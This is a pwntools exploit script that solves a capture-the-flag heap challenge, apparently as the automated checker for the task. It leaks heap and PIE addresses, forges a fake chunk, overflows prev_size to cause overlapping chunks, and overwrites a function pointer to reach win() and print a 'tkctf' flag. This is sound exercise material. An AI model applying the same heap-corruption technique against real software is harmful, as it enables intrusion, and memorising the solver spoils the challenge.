#!/usr/bin/env python3

import os
import re
import sys
from pwn import *

context.arch = "x86_64"
context.log_level = 'info'

ROOT = os.path.abspath(os.path.dirname(__file__))
bin_path = os.path.join(ROOT, "../docker/target")

# Detect if binary is 32-bit or 64-bit
elf_test = ELF(bin_path)
is_32bit = elf_test.bits == 32
if is_32bit:
    context.arch = "i386"
    log.info("Detected 32-bit binary")
else:
    log.info("Detected 64-bit binary")

def manifest(p, zone):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'(0-9): ', str(zone).encode())

def inscribe(p, zone, data):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'(0-9): ', str(zone).encode())
    p.sendlineafter(b'max 128 bytes): ', data)

def view(p, zone):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'(0-9): ', str(zone).encode())
    return p.recvuntil(b'> ', drop=True)

def corrupt(p, zone):
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b'(0-9): ', str(zone).encode())

def liberate(p, zone):
    p.sendlineafter(b'> ', b'5')
    p.sendlineafter(b'(0-9): ', str(zone).encode())

def execute_timeline(p):
    p.sendlineafter(b'> ', b'6')

def exploit(p):
    elf = ELF(bin_path)
    win_addr = elf.symbols['win']
    is_32bit = elf.bits == 32

    # Set pointer packing function based on architecture
    pack_ptr = p32 if is_32bit else p64
    ptr_size = 4 if is_32bit else 8

    log.info("Manifesting all zones")
    for i in range(10):
        manifest(p, i)

    log.info("Leaking heap address")
    output = view(p, 3)
    try:
        heap_leak = int(output.split(b'0x')[1].split(b']')[0], 16)
        log.success(f"Heap leak: {hex(heap_leak)}")
        zone_3_addr = heap_leak
    except:
        log.error("Failed to parse heap leak")
        log.info(output.decode('latin-1', errors='ignore'))
        return None

    log.info("Crafting fake chunk in Zone 3")

    # Calculate chunk sizes based on architecture
    # For 32-bit: malloc(0x100) -> 0x108 chunk, malloc(0x180) -> 0x188 chunk
    # For 64-bit: malloc(0x100) -> 0x110 chunk, malloc(0x180) -> 0x190 chunk
    if is_32bit:
        zone_3_chunk = 0x188
        zone_4_chunk = 0x108
        zone_5_chunk = 0x108
        fake_size = 0x109  # Size with PREV_IN_USE flag
    else:
        zone_3_chunk = 0x190
        zone_4_chunk = 0x110
        zone_5_chunk = 0x110
        fake_size = 0x111

    zone_6_addr = zone_3_addr + zone_3_chunk + zone_4_chunk + zone_5_chunk
    log.info(f"Zone 6 estimated at: {hex(zone_6_addr)}")

    fake_chunk_offset = 0x80
    fake_chunk_addr = zone_3_addr + fake_chunk_offset
    prev_size_value = zone_6_addr - fake_chunk_addr

    log.info(f"Fake chunk at: {hex(fake_chunk_addr)}")
    log.info(f"Prev_size value: {hex(prev_size_value)}")

    fake_chunk = flat({
        0x00: pack_ptr(0),
        ptr_size: pack_ptr(fake_size),
    }, length=0x80, word_size=ptr_size*8)

    inscribe(p, 3, fake_chunk)

    log.info("Enabling corruption on Zone 3")
    corrupt(p, 3)

    log.info("Overflowing into Zone 4 to corrupt metadata")

    overflow_payload = b'A' * 0x80 + pack_ptr(prev_size_value)[:(ptr_size-1)]
    inscribe(p, 3, overflow_payload)

    log.info("Liberating Zone 6")
    liberate(p, 6)

    log.info("Getting PIE base")
    output = view(p, 9)
    try:
        exec_ptr = int(output.split(b'Execute ptr: 0x')[1].split(b']')[0], 16)
        log.success(f"Execute ptr: {hex(exec_ptr)}")

        elf_base = exec_ptr - elf.symbols['safe_exit']
        win_addr_full = elf_base + win_addr
        log.success(f"PIE base: {hex(elf_base)}")
        log.success(f"win() at: {hex(win_addr_full)}")
    except:
        log.warning("Could not leak PIE base, using relative address")
        win_addr_full = win_addr

    log.info("Attempting to overwrite function pointer")

    payload = pack_ptr(win_addr_full)
    inscribe(p, 7, payload)

    log.info("Executing timeline")
    execute_timeline(p)

    return p.recvall(timeout=2)

def parse_flag(out):
    m = re.search(b"(tkctf{[^}]+})", out)
    if m is None:
        return None
    return m.group(0).decode()

if __name__ == '__main__':
    if "REMOTE" in os.environ:
        if not "PORT" in os.environ:
            print("[!] Please specify the port number")
            exit(1)
        p = remote("localhost", int(os.environ["PORT"]))
    else:
        p = process(bin_path)

    output = exploit(p)
    if output:
        flag = parse_flag(output)
        if flag:
            print(f"Found: {flag}")
            print("OK!")
            exit(0)

    print("FAILED!")
    exit(1)

